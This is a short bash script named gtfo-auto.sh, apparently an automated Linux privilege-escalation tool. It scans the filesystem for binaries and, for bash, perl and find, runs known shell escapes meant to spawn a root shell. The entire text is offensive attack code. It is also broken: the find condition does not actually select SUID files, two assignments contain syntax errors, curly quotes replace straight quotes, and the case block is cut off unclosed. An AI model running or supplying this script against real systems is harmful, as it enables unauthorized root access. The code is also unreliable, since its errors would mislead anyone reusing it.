#!/bin/bash
# gtfo-auto.sh

echo “[*] Scanning for SUID GTFOBins...”
bins=$ (find / -perm -400 -type f 2>/dev/null)

for bin in $bins; do
	name$(basename “$bin”)
	case $name in 
		bash)	
		 	echo “[+] Exploiting $bin”
			$bin -p 
			;;
		perl)
			echo “[+] Exploiting $bin”
			$bin -e 'use POSIX (setuid); POSIX::setuid(0);
exec “/bin/sh”;'
		;;
		find)
			echo “[+] Exploiting $bin”
			$bin . -exec /bin/sh \;
			;;
